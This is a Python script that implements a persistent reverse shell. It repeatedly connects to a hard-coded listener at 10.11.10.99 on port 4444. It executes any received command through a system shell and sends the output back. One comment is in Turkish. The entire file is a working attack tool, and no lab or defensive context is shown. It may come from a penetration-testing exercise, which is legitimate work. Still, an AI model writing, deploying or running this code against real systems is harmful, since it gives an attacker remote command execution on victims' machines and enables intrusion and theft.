import socket
import subprocess
import os
import time

HOST = '10.11.10.99'  # Listener IP
PORT = 4444           # Listener Port

def reliable_connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            shell(s)
        except Exception:
            s.close()
            time.sleep(5)  # 5 saniye sonra tekrar dene

def shell(s):
    while True:
        try:
            command = s.recv(1024).decode()
            if command.lower() == 'exit':
                break
            if command.startswith('cd '):
                try:
                    os.chdir(command.strip()[3:])
                    s.send(b'[+] Directory changed\n')
                except Exception as e:
                    s.send(f'[!] Error: {str(e)}\n'.encode())
                continue
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output
        except Exception as e:
            output = str(e).encode()
        if not output:
            output = b'[+] Command executed\n'
        try:
            s.send(output)
        except:
            break
    s.close()

reliable_connect()

